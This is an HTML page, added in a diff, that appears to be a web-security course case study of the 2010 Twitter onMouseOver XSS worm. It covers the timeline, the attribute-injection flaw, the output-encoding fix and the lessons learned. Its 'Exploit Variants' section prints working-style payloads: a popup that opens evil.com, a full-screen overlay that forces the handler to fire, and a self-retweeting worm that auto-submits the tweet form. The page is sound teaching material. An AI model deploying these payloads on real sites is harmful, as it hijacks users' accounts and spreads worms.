@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Case Study — Twitter onMouseOver Worm (2010)</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:36px 32px;max-width:860px}
+  h1{font-size:24px;font-weight:800;color:var(--accent);margin-bottom:6px}
+  .meta{font-size:12px;color:var(--muted);margin-bottom:28px}
+  h2{font-size:16px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:5px;border-bottom:1px solid var(--border)}
+  p{font-size:14px;line-height:1.7;color:var(--text);margin-bottom:12px}
+  code{font-family:'Courier New',monospace;font-size:12px;background:#060d1a;color:var(--orange);padding:2px 6px;border-radius:3px}
+  pre{background:#060d1a;border:1px solid var(--border);border-radius:6px;padding:16px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);overflow-x:auto;margin:12px 0;white-space:pre-wrap}
+  .timeline{border-left:2px solid var(--accent);padding-left:20px;margin:16px 0}
+  .timeline-item{margin-bottom:14px;position:relative}
+  .timeline-item::before{content:'';position:absolute;left:-25px;top:5px;width:8px;height:8px;background:var(--accent);border-radius:50%}
+  .t-time{font-size:11px;color:var(--muted);font-weight:700}
+  .t-event{font-size:13px;color:var(--text)}
+  .callout{background:var(--panel);border-left:3px solid var(--warn);padding:12px 16px;border-radius:0 6px 6px 0;margin:16px 0;font-size:13px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px;display:inline-block;margin-right:4px}
+  .t-worm{background:#001a0d;color:var(--ok)}
+  .t-bypass{background:#2a0000;color:var(--danger)}
+  nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+</style>
+</head>
+<body>
+
+<h1>Twitter onMouseOver Worm — September 21, 2010</h1>
+<div class="meta">
+  <span class="tag t-worm">REFLECTED + STORED XSS</span>
+  <span class="tag t-bypass">ATTRIBUTE INJECTION</span>
+  Impact: Tens of thousands of infected tweets &nbsp;|&nbsp; Fixed within hours &nbsp;|&nbsp; Module: M16
+</div>
+
+<h2>Background</h2>
+<p>On September 21, 2010, Twitter users discovered that tweet text was not being properly HTML-encoded before being inserted into the page. Specifically, text in tweet content was reflected into HTML attribute contexts without escaping, allowing event handler injection via <code>onmouseover</code>.</p>
+<p>Multiple exploiters — some malicious, some testing — published self-retweeting payloads within hours of each other. Tens of thousands of infected tweets appeared. The payloads caused popups, redirected users to NSFW sites, posted spam tweets, and in one variant covered the entire page to maximise mouseover triggering.</p>
+<p>Twitter's engineering team deployed a fix within hours, but not before the worm had spread significantly and received major media coverage.</p>
+
+<h2>Timeline</h2>
+<div class="timeline">
+  <div class="timeline-item">
+    <div class="t-time">September 21, 2010 — Morning</div>
+    <div class="t-event">First reports of tweets with <code>onmouseover</code> payloads appearing in timelines.</div>
+  </div>
+  <div class="timeline-item">
+    <div class="t-time">September 21, 2010 — Midday</div>
+    <div class="t-event">Multiple exploiters publish variants. Self-retweeting payloads begin viral spread. Media coverage starts.</div>
+  </div>
+  <div class="timeline-item">
+    <div class="t-time">September 21, 2010 — Afternoon</div>
+    <div class="t-event">Twitter acknowledges the issue publicly on their status blog.</div>
+  </div>
+  <div class="timeline-item">
+    <div class="t-time">September 21, 2010 — Evening</div>
+    <div class="t-event">Twitter deploys fix. Output encoding corrected. Infected tweets remain but no longer execute.</div>
+  </div>
+</div>
+
+<h2>The Vulnerability</h2>
+<p>Twitter's tweet rendering inserted tweet text directly into an HTML context. The tweet text was placed inside a <code>&lt;span&gt;</code> tag's inner content — but when the text contained special characters like <code>"</code> and <code>&gt;</code>, these were not escaped.</p>
+<p>A tweet containing:</p>
+<pre>onmouseover="alert(document.cookie)"</pre>
+<p>Was rendered as:</p>
+<pre>&lt;span class="tweet-text" onmouseover="alert(document.cookie)"&gt;...&lt;/span&gt;</pre>
+
+<p>This is a classic HTML attribute injection — the injection closes the existing attribute and adds a new event handler. The tweet text was never supposed to contain raw attribute injection, but the absence of output encoding made it possible.</p>
+
+<h2>Exploit Variants</h2>
+
+<p><strong>Basic popup:</strong></p>
+<pre>onmouseover=".open('http://evil.com')"</pre>
+
+<p><strong>Full-screen overlay for guaranteed trigger:</strong></p>
+<pre>style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"
+onmousemove="/* payload */"</pre>
+<p>This variant made the payload fire for any mouse movement on the page — no interaction required on the tweet itself.</p>
+
+<p><strong>Self-retweeting worm:</strong></p>
+<pre>onmouseover="document.getElementById('status').value=this.outerHTML;
+  document.forms['update'].submit()"</pre>
+<p>This populated the tweet compose box with the worm payload and auto-submitted it, infecting the viewer's account and propagating to their followers.</p>
+
+<div class="callout">
+<strong>Key observation:</strong> The "full-screen" trick is a general technique for making mouseover/mousemove payloads near-certain to fire. A <code>position:fixed; width:100%; height:100%</code> element covers the viewport. Any mouse movement anywhere on the page triggers the event. This technique appears in bug bounty reports to increase PoC impact.
+</div>
+
+<h2>Why This Is Structurally Different from the Samy Worm</h2>
+<table style="width:100%;border-collapse:collapse;font-size:13px;margin:12px 0">
+  <tr style="color:var(--muted)"><th style="text-align:left;padding:8px;border-bottom:1px solid var(--border)"></th><th style="padding:8px;border-bottom:1px solid var(--border)">Samy Worm</th><th style="padding:8px;border-bottom:1px solid var(--border)">Twitter Worm</th></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">XSS type</td><td style="padding:8px;border-bottom:1px solid var(--border)">Stored (profile)</td><td style="padding:8px;border-bottom:1px solid var(--border)">Stored (tweet)</td></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">Injection context</td><td style="padding:8px;border-bottom:1px solid var(--border)">HTML body (via CSS)</td><td style="padding:8px;border-bottom:1px solid var(--border)">HTML attribute</td></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">Trigger</td><td style="padding:8px;border-bottom:1px solid var(--border)">Page load (auto)</td><td style="padding:8px;border-bottom:1px solid var(--border)">Mouse hover (interaction)</td></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">Worm spread</td><td style="padding:8px;border-bottom:1px solid var(--border)">Profile-to-profile</td><td style="padding:8px;border-bottom:1px solid var(--border)">Retweet-to-follower</td></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">Detection</td><td style="padding:8px;border-bottom:1px solid var(--border)">Profile update volume</td><td style="padding:8px;border-bottom:1px solid var(--border)">User reports + tweet volume</td></tr>
+  <tr><td style="padding:8px;border-bottom:1px solid var(--border)">Fix time</td><td style="padding:8px;border-bottom:1px solid var(--border)">Site offline; hours</td><td style="padding:8px;border-bottom:1px solid var(--border)">Hours, no downtime needed</td></tr>
+</table>
+
+<h2>The Fix</h2>
+<p>One line of code: apply HTML output encoding to tweet text before inserting it into the page template. The character <code>"</code> must be encoded as <code>&amp;quot;</code> (or <code>&#34;</code>) when inside an HTML attribute context. The character <code>&gt;</code> must be encoded as <code>&amp;gt;</code>.</p>
+<p>In any template engine: use auto-escaping. In Django: <code>{{ tweet.text }}</code> (not <code>{{ tweet.text | safe }}</code>). In Flask/Jinja2: same. In React: <code>{tweet.text}</code> in JSX (not <code>dangerouslySetInnerHTML</code>). The default is safe; the vulnerability was opting out of the default.</p>
+
+<h2>Lessons</h2>
+<ol style="padding-left:20px;font-size:14px;line-height:2">
+  <li>Even the most security-aware companies ship classic XSS bugs. Twitter was a major tech company with security engineers when this bug shipped.</li>
+  <li>The time from disclosure to weaponisation was hours. The time from weaponisation to tens of thousands of infected accounts was also hours. XSS bugs in social contexts spread faster than patches can be deployed.</li>
+  <li>The fix was one line. The cost was vastly disproportionate to the effort of the fix. Output encoding is the cheapest security control per-impact-prevented of any web security measure.</li>
+  <li>The full-screen overlay technique demonstrates that "requires user interaction" (mouseover) does not meaningfully limit XSS impact — interaction is trivial to force.</li>
+</ol>
+
+<nav>
+  <a href="samy_worm.html">← Samy Worm</a>
+  <a href="magecart.html">Next: Magecart →</a>
+</nav>
+
+</body>
+</html>
